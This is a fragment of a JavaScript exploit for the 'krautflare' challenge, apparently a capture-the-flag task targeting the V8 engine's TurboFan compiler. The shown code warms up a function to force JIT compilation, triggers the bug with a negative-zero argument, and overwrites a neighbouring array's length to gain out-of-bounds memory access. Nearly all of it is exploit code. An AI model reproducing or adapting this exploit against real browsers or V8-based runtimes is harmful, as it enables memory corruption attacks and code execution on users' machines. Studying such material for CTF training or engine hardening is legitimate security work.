 ...
 * Author: raycp
 * 
 * Last Modified: 2020-01-25 03:37:57
 * Description: exp for krautflare 
************************************************************/
...
function foo(x) {
    ...
    oobArray = b;
    // return a[idx];	
    a[idx]=i2f(0x0000202000000000);   // overwrite b.length to 0x2020.
}

// call foo(0) first to gather number info
foo(0);
for(let i=0; i<10000; i++) {
    foo("0")   // then gather raw string info and trigger turbofan to compiler function.
}

foo(-0); // trigger vuln here.

gc();  // gc to get stable heap state

console.log("[+] now oobArray length: "+oobArray.length);
